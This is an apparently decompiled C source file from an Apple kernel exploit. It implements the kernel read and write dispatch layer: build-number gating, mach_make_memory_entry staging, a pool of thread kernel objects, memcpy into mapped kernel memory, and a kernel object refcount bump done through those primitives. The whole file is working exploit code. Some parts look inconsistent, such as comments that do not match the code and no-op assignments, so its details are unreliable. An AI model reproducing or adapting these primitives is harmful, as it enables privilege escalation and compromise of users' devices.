/* record_0x90000_e9f89858_kread_kwrite_dispatch.c
 * sub_085f4..sub_08fd4 — kread/kwrite dispatch layer, mach_make_memory_entry
 * staging, thread-kobj cache pool, kobj field read/write helpers,
 * port-name arithmetic, and refcount bump.
 */
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <mach/mach.h>

/* forward decl */
static long sub_08c8c(long state, long thr_kobj, long port_name);

/* ── extern helpers ─────────────────────────────────────────────── */
extern int  sub_28840(long state, long addr, long *out);
extern int  sub_2572c(long state, long addr, uint32_t sz, void *out);
extern int  sub_2a188(long state, long addr, void *val, int sz);
extern int  sub_28dfc(long state, long addr, int val);
extern long sub_1972c(long state, long addr);
extern long sub_02c78(long state, long port);
extern long sub_03a88(long state, long h, int fl);
extern long sub_02d24(long state);
extern long sub_0492c(long state, long h);
extern long sub_07210(long state, uint32_t *port);
extern long sub_08378(long state, long base, long slide, uint64_t addr);
extern long sub_08544(long state, long base, long slide, uint64_t addr);
extern long sub_08870(long state, uint64_t addr, long *ctx);
extern long sub_08bcc(long state, long *ctx);

/* ── sub_085f4 — cached kext base + sub_08544 slide lookup ──────── */
long sub_085f4(long state, uint64_t addr)
{
    long base = *(long *)(state + 0x18a8);
    long slide = *(long *)(state + 0x18b0);
    if (!base) {
        long h = sub_02d24(state);
        if (!h) return 0;
        h = sub_0492c(state, h);
        if (!h) return 0;
        long v0 = 0, v1 = 0;
        if (!sub_28840(state, h, &v0)) return 0;
        if (!sub_28840(state, h + (long)*(int *)(state + 0x168), &v1)) return 0;
        *(long *)(state + 0x18a8) = v0;
        *(long *)(state + 0x18b0) = v1;
        base = v0; slide = v1;
    }
    return sub_08544(state, base, slide, addr);
}

/* ── sub_086ac — cached kext base + sub_08378 slide lookup ──────── */
long sub_086ac(long state, uint64_t addr)
{
    long base = *(long *)(state + 0x18a8);
    long slide = *(long *)(state + 0x18b0);
    if (!base) {
        long h = sub_02d24(state);
        if (!h) return 0;
        h = sub_0492c(state, h);
        if (!h) return 0;
        long v0 = 0, v1 = 0;
        if (!sub_28840(state, h, &v0)) return 0;
        if (!sub_28840(state, h + (long)*(int *)(state + 0x168), &v1)) return 0;
        *(long *)(state + 0x18a8) = v0;
        *(long *)(state + 0x18b0) = v1;
        base = v0; slide = v1;
    }
    return sub_08378(state, base, slide, addr);
}

/* ── sub_08764 — clear kobj staging context (7 slots) ───────────── */
void sub_08764(long state)
{
    long *ctx = (long *)(state + 0x2b0);
    /* zero 8 slots of 0x10 bytes each */
    memset(ctx, 0, 8 * 0x10);
    *(uint32_t *)(state + 0x2a8) = 0;
}

/* ── sub_08870 — mach_make_memory_entry + thread-kobj pool alloc ───
 * Creates a named memory entry for one page, resolves its kobj,
 * locks the pool mutex, and either pops a cached thread-kobj or
 * calls sub_07210 to allocate a fresh one.
 * Fills ctx[0..6] with: mapped_addr, page_count, kobj_addr,
 * port_name, mask, page_size, extra.                             */
long sub_08870(long state, uint64_t addr, long *ctx)
{
    int build = *(int *)(state + 0x140);
    /* version gate */
    if (build < 0x1f53 && build != 0x1809 && build != 0x1c1b &&
        build != 0x2258 && build != 0x225c && build != 0x2712)
        return 0x2802c;

    memset(ctx, 0, 7 * sizeof(long));

    uint64_t page_size = *(uint64_t *)(state + 0x180);
    ctx[5] = (long)page_size;

    mem_entry_name_port_t entry = 0;
    vm_size_t sz2 = (vm_size_t)page_size;
    kern_return_t kr = mach_make_memory_entry(mach_task_self(), &sz2,
                                              0, VM_PROT_ALL | MAP_MEM_NAMED_CREATE,
                                              &entry, 0);
    if (kr) return (long)(kr | 0x80000000u);

    long kobj = sub_02c78(state, (long)entry);
    if (!kobj) { ctx[3] = (long)entry; return 0x28026; }

    long chain = sub_03a88(state, kobj, 0);
    if (!chain) { ctx[3] = (long)entry; return 0xad009; }

    /* lock pool */
    pthread_mutex_t *mtx = (pthread_mutex_t *)(state + 0x268);
    kr = pthread_mutex_lock(mtx);
    if (kr) { ctx[3] = (long)entry; return (long)kr; }

    uint32_t idx = *(uint32_t *)(state + 0x2a8);
    long *slot = (long *)(state + (uint64_t)idx * 0x10 + 0x2b0);
    long cached = *slot;
    long thr_kobj = 0;

    if (cached) {
        int cached_port = *(int *)(state + (uint64_t)idx * 0x10 + 0x2b8);
        if (cached_port) {
            *slot = 0;
            *(int *)(state + (uint64_t)idx * 0x10 + 0x2b8) = 0;
            pthread_mutex_unlock(mtx);
            thr_kobj = cached;
            ctx[6] = (long)cached_port;
            goto done;
        }
    }
    pthread_mutex_unlock(mtx);

    {
        uint32_t port_name = 0x40;
        thr_kobj = sub_07210(state, &port_name);
        if (!thr_kobj) { ctx[3] = (long)entry; return 0; }
        ctx[6] = (long)port_name;
    }

done:
    ctx[0] = (long)(addr & *(uint64_t *)(state + 0x188));
    ctx[1] = 1;
    ctx[2] = thr_kobj;
    ctx[3] = (long)entry;
    ctx[4] = (long)(*(uint64_t *)(state + 0x188));
    return 0;
}

/* ── sub_08bcc — release mach_make_memory_entry staging context ─────
 * Writes -1 to the kobj field, vm_deallocates the mapping, and
 * deallocates the memory entry port. Returns the thread-kobj to
 * the pool via sub_08c8c.                                        */
long sub_08bcc(long state, long *ctx)
{
    long r = 0xad001;
    if (ctx[2] && ctx[0]) {
        if (!sub_28dfc(state, ctx[2] + (uint64_t)ctx[6], -1)) return 0x28010;
        vm_deallocate(mach_task_self(), (vm_address_t)ctx[0],
                      (vm_size_t)((uint64_t)ctx[1] * (uint64_t)*(uint32_t *)((char *)ctx + 0x1c)));
        kern_return_t kr = mach_port_deallocate(mach_task_self(), (mach_port_name_t)ctx[0x34/8]);
        if (kr) return (long)(kr | 0x80000000u);
        r = sub_08c8c(state, ctx[2], (long)ctx[3]);
    }
    memset(ctx, 0, 7 * sizeof(long));
    return r;
}

/* ── sub_08c8c — return thread-kobj to pool ─────────────────────── */
static long sub_08c8c(long state, long thr_kobj, long port_name)
{
    pthread_mutex_t *mtx = (pthread_mutex_t *)(state + 0x268);
    kern_return_t kr = pthread_mutex_lock(mtx);
    if (kr) return (long)kr;

    uint64_t idx = *(uint32_t *)(state + 0x2a8);
    if (idx < 8) {
        long *slot = (long *)(state + idx * 0x10 + 0x2b0);
        for (uint64_t i = idx; i < 8; i++, slot += 2) {
            if (!*slot) {
                *(uint32_t *)(state + 0x2a8) = (uint32_t)i;
                *slot = thr_kobj;
                *(int *)(state + i * 0x10 + 0x2b8) = (int)port_name;
                pthread_mutex_unlock(mtx);
                return 0;
            }
        }
    }
    pthread_mutex_unlock(mtx);
    return 0xad009;
}

/* ── sub_08d60 — kread dispatch ─────────────────────────────────── */
long sub_08d60(long state, uint64_t addr, void *buf, uint64_t sz, int fallback)
{
    typedef long (*kread_fn)(long, uint64_t, void *, uint64_t);
    kread_fn fn = *(kread_fn *)(state + 0x38);
    if (!fn) {
        if (!fallback) return 0xad001;
        uint64_t ver = *(uint64_t *)(state + 0x158);
        if (ver >= 0x27120f04b00003ULL && (*(uint8_t *)state >> 5 & 1))
            return 0xad008;
        long ctx[7];
        long r = sub_08870(state, addr, ctx);
        if ((int)r) return r;
        memcpy(buf, (void *)((*(uint64_t *)(state + 0x188) & addr) + ctx[0]), (size_t)sz);
        return sub_08bcc(state, ctx);
    }
    return fn(state, addr, buf, sz);
}

/* ── sub_08e4c — kwrite dispatch ────────────────────────────────── */
long sub_08e4c(long state, uint64_t addr, void *buf, uint64_t sz, int fallback)
{
    typedef long (*kwrite_fn)(long, uint64_t, void *, uint64_t);
    kwrite_fn fn = *(kwrite_fn *)(state + 0x48);
    if (!fn) {
        if (!fallback) return 0xad001;
        uint64_t ver = *(uint64_t *)(state + 0x158);
        if (ver >= 0x27120f04b00003ULL && (*(uint8_t *)state >> 5 & 1))
            return 0xad008;
        long ctx[7];
        long r = sub_08870(state, addr, ctx);
        if ((int)r) return r;
        memcpy((void *)((*(uint64_t *)(state + 0x188) & addr) + ctx[0]), buf, (size_t)sz);
        return sub_08bcc(state, ctx);
    }
    return fn(state, addr, buf, sz);
}

/* ── sub_08f38 — kread 2 bytes at kobj+8 ────────────────────────── */
uint32_t sub_08f38(long state, long kobj, void *out)
{
    return sub_2572c(state, kobj + 8, 2, out) ? 0 : 0x2800f;
}

/* ── sub_08f6c — kwrite 2 bytes at kobj+8 ───────────────────────── */
uint32_t sub_08f6c(long state, long kobj, uint16_t val)
{
    uint16_t v = val;
    return sub_2a188(state, kobj + 8, &v, 2) ? 0 : 0x28010;
}

/* ── sub_08fac — port-name increment with saturation ────────────── */
uint32_t sub_08fac(uint32_t name)
{
    uint32_t r = 0xfffffffe;
    if (name < 0xfff5) r = name + 10;
    if (name < 0xfffe) name = r;
    return name & 0xffff;
}

/* ── sub_08fd4 — kobj refcount bump via kread+kwrite ────────────── */
uint32_t sub_08fd4(long state, long kobj)
{
    long v = sub_1972c(state, kobj);
    if (!v) return 0x28026;

    uint16_t cur = 0, next = 0;
    if (!sub_2572c(state, kobj + 8, 2, &cur)) return 0x2800f;
    if (cur >= 0xfffe) return 0;

    next = cur;
    if (cur < 0xfff5) next = cur + 10;
    if (cur < 0xfffe) next = next;
    next &= 0xffff;

    return sub_2a188(state, kobj + 8, &next, 2) ? 0 : 0x28010;
}
